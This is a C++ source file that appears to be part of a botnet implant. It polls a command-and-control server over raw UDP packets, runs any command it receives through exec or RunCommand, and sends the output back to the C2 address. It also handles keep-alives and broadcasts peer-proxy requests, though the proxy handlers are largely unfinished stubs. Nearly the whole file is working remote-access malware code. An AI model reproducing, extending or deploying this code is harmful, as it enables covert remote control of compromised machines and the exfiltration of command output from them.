#include "BPHelper.hpp"

std::mutex socketMutex;

int BPHelper::actionResponse(std::unique_ptr<PacketParse::info_t> eventInfo) {
    std::lock_guard<std::mutex> g(socketMutex);
    std::string output = "";
    std::string rawCommand(reinterpret_cast<char *>(eventInfo->bpRawCommand.raw_command));

    switch (eventInfo->bpHeader.header_type) {
        case 0x02: {
            // execute command then respond
            // std::cout << "Received a Command to Execute" << std::endl;
#if defined(_WIN32) || defined(WIN32)
            std::string del = " ";
            size_t found = rawCommand.find(del);
            std::string cmd, arguments;
            if (found != std::string::npos) {
                cmd = rawCommand.substr(0, rawCommand.find(del));
                arguments = rawCommand.substr(rawCommand.find(del), rawCommand.length() - 1);
            } else {
                cmd = rawCommand;
                arguments = "";
            }
            auto result = RunCommand(cmd, arguments);
            if (result->error) {
                output = result->std_error;
            } else {
                output = result->std_output;
            }
#else
            output = exec(rawCommand.c_str());
#endif

            // Building packet to send the response to the C2
            PacketParse::bp_header_t bpHeader{};
            PacketParse::bp_response_t bp_response{};
            bpHeader.header_type = 0x03;
            bp_response.host_ip = rawSocket.getIP();
            bp_response.command_num = htonl(currentCmd);
            if (output.length() > sizeof(bp_response.data)) {
                bp_response.data_len = htons(static_cast<uint16_t>(sizeof(bp_response.data)));
                memcpy(bp_response.data, output.c_str(), sizeof(bp_response.data));
            } else {
                bp_response.data_len = htons(static_cast<uint16_t>(output.length()));
                memcpy(bp_response.data, output.c_str(), output.length());
            }

            auto bp_header_ptr = reinterpret_cast<unsigned char *>(&bpHeader);
            auto bp_ptr = reinterpret_cast<unsigned char *>(&bp_response);

            std::vector<uint8_t> payload(bp_header_ptr, bp_header_ptr + sizeof(bpHeader));
            payload.insert(payload.end(), bp_ptr, bp_ptr + sizeof(bp_response));

#ifdef __unix__
            // Sending the command output to the C2
            std::vector<uint8_t> req =
                CraftUDPPacket(rawSocket.getIP(), c2Ip, srcPort, dstPort, payload, rawSocket.getMac(), nextHopMac);

#else
            // Sending the command output to the C2
            std::vector<uint8_t> req = CraftUDPPacket(rawSocket.getIP(), c2Ip, srcPort, dstPort, payload);

#endif

            rawSocket.send(req);

            currentCmd++;
            return 1;
        }
        case 0x04: {
            // keep alive to eventually inform the bot if it needs to switch it's transmission method.
            // std::cout << "Received a Keep Alive" << std::endl;
            if (eventInfo->bpKeepAlive.command_num == currentCmd) {
                currentCmd++;
            }
            return 1;
        }
        case 0x05: {
#if defined(_WIN32) || defined(WIN32)
            // Windows Proxy not support yet
            return -1;
#endif
            // TODO: Handle Proxy stuff
            // Check the proxy type value
            switch (eventInfo->bpProxy.msg_type) {
                case PacketParse::proxy_code_t::noop_e: {
                    // noop
                    std::cout << "Proxy NOOP received!" << std::endl;
                    return 1;
                }
                case PacketParse::proxy_code_t::proxy_req_e: {
                    std::cout << "Proxy REQUEST received!" << std::endl;
                    // Proxy REQUEST message
                    // Handle responding to PROXY REQUEST message here

                    // This is where we will handle responding to proxy requests

                    // If not cutoff from the server:
                    // Respond via unicast to the request with the same session ID and information
                    return 1;
                }
                case PacketParse::proxy_code_t::proxy_resp_e: {
                    std::cout << "Proxy RESPONSE received!" << std::endl;
                    std::cout << "[!] Initiating session..." << std::endl;
                    // Proxy RESPONSE message
                    // Handle final setup of proxy session

                    // This means someone is accepting our proxy request

                    // Check to see if we are currently proxied
                    // If not currently proxied:
                    // Initiate the proxy session by responding to our Proxy with the information to proxy
                    return 1;
                }
                case PacketParse::proxy_code_t::serv_info_e: {
                    std::cout << "Proxy SERVER MSG received!" << std::endl;
                    // Packet is intended for the server or is already part of an established proxy session
                    // Not much to do here
                    return 1;
                }
                case PacketParse::proxy_code_t::proxy_end_e: {
                    std::cout << "Proxy END MSG received!" << std::endl;
                    std::cout << "[!] Ending proxy session..." << std::endl;
                    // PROXY END message

                    // If we are currently proxied:
                    // End the session by unsetting some global value

                    // Otherwise:
                    // Do nothing
                    return 1;
                }
                default: {
                    // Improper proxy message ID
                    std::cout << "Improper proxy message ID" << std::endl;
                    return -1;
                }
            }
        }
        default: {
            // std::cout << "Not a Command or Keep Alive" << std::endl;
            return -1;
        }
    }
}

void BPHelper::requestAction() {
    std::lock_guard<std::mutex> g(socketMutex);
    // ! Testing Proxy Switch
    this->proxyTesting = true;
    if (!this->proxyTesting) {
        PacketParse::bp_header_t bpHeader{};
        PacketParse::bp_command_request_t bp_command_request_header{};
        bpHeader.header_type = 0x01;
        bp_command_request_header.target_OS = 0x01;
        bp_command_request_header.command_num = htonl(currentCmd);
        bp_command_request_header.host_ip = rawSocket.getIP();

        auto bp_header_ptr = reinterpret_cast<unsigned char *>(&bpHeader);
        auto bp_ptr = reinterpret_cast<unsigned char *>(&bp_command_request_header);

        std::vector<uint8_t> payload(bp_header_ptr, bp_header_ptr + sizeof(bpHeader));
        payload.insert(payload.end(), bp_ptr, bp_ptr + sizeof(bp_command_request_header));

#if defined(_WIN32) || defined(WIN32)
        std::vector<uint8_t> req = CraftUDPPacket(rawSocket.getIP(), c2Ip, srcPort, dstPort, payload);
        rawSocket.send(req);
#else
        std::vector<uint8_t> req =
            CraftUDPPacket(rawSocket.getIP(), c2Ip, srcPort, dstPort, payload, rawSocket.getMac(), nextHopMac);
        rawSocket.send(req);
#endif
    } else {
        // ! Testing Proxy mode only!
        // * Sending out proxy requests
        PacketParse::bp_header_t bpHeader{};
        PacketParse::bp_proxy_t proxyHeader{};
        bpHeader.header_type = 0x05;
        proxyHeader.msg_type = PacketParse::proxy_code_t::proxy_req_e;  // Sending proxy request

        // Session ID
        std::srand(static_cast<unsigned int>(time(nullptr)));
        proxyHeader.session_id = static_cast<uint32_t>(std::rand());

        // Place holder data for now
        std::string placeholder{"Placeholder for data to proxy"};

        auto bp_header_ptr = reinterpret_cast<unsigned char *>(&bpHeader);
        auto proxy_ptr = reinterpret_cast<unsigned char *>(&proxyHeader);

        // Packet payload;
        // payload.emplace_back(bpHeader, proxyHeader, placeholder);
        std::vector<uint8_t> payload(bp_header_ptr, bp_header_ptr + sizeof(bpHeader));
        payload.insert(payload.end(), proxy_ptr, proxy_ptr + sizeof(proxyHeader));
        // payload.emplace_back(placeholder);
        std::copy(placeholder.begin(), placeholder.end(), std::back_inserter(payload));

        uint8_t broadcast[4] = {255, 255, 255, 255};
        uint32_t broad = *reinterpret_cast<uint32_t *>(broadcast);
        std::vector<uint8_t> req =
            CraftUDPPacket(rawSocket.getIP(), broad, srcPort, dstPort, payload, rawSocket.getMac(), nextHopMac);
        rawSocket.send(req);
    }
}

BPHelper::BPHelper() {
#ifdef __unix__
    rawSocket = RawSocket(c2Ip, false);
    if (useGateway) {
        nextHopMac = rawSocket.getMacOfIP(ntohl(gatewayIp));
    } else {
        nextHopMac = rawSocket.getMacOfIP(ntohl(c2Ip));
    }
#elif defined(_WIN32) || defined(WIN32)
    rawSocket = RawSocket(c2Ip);
#endif
    currentCmd = 0;
}

void BPHelper::Receive() {
    while (true) {
        rawSocket.receive();
        Packet packet = rawSocket.getPacket();
        if (!packet.empty()) {
            std::unique_ptr<PacketParse::info_t> info = PacketParse::parsePacket(packet);
#ifdef __unix__
            if (info->bpHeader.magic_bytes == PacketParse::MAGIC_BYTES &&
                info->ipHeader.dst_addr == ntohl(rawSocket.getIP())) {
                actionResponse(move(info));
            }
#elif defined(_WIN32) || defined(WIN32)
            if (info->bpHeader.magic_bytes == PacketParse::MAGIC_BYTES) {
                actionResponse(move(info));
            }
#endif
        }
        std::this_thread::sleep_for(std::chrono::milliseconds(1));
    }
}

void BPHelper::requestActionLoop(int interval) {
    while (true) {
        std::this_thread::sleep_for(std::chrono::milliseconds(interval));
        this->requestAction();
    }
}

void BPHelper::requestActionThread() {
    std::thread t1(&BPHelper::requestActionLoop, this, requestActionInterval);
    t1.detach();
}
